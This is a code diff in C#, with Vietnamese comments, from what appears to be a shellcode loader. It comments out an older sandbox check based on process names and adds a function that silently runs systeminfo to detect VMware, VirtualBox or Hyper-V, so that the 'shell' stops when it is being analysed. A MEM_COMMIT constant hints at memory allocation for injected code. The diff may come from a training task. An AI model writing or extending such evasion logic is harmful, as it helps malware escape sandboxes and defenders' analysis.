@@ -120,7 +120,7 @@ namespace Test_Task2
                 return true;
             }
             return false; // Not detect sandbox
-        } */
+        } 
 // Check tiến trình nếu phát hiện có những tên được liệt kê sẽ ngừng shell
                 private static bool IsRunningInSandbox()
         {
@@ -149,6 +149,39 @@ namespace Test_Task2
             {
                 return false;
             }
+        } */
+
+        // Dùng lệnh systeminfo để check dòng System Model
+        private static bool IsSystemVirtualized()
+        {
+            try
+            {
+                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c systeminfo")
+                {
+                    RedirectStandardOutput = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                };
+
+                Process proc = Process.Start(psi);
+                string output = proc.StandardOutput.ReadToEnd();
+                proc.WaitForExit();
+
+                // Split the output into lines and find the one with "System Model"
+                string[] lines = output.Split(new[] { Environment.NewLine }, StringSplitOptions.None);
+                string systemModelLine = lines.FirstOrDefault(line => line.StartsWith("System Model", StringComparison.OrdinalIgnoreCase));
+
+                if (systemModelLine != null &&
+                    (systemModelLine.Contains("Virtual") || systemModelLine.Contains("VMware") || systemModelLine.Contains("VirtualBox") || systemModelLine.Contains("Hyper-V")))
+                {
+                    return true; // Detected virtual environment
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error checking system info: " + ex.Message);
+            }
+            return false; // Not virtualized
         }
 
         private static UInt32 MEM_COMMIT = 0x1000;
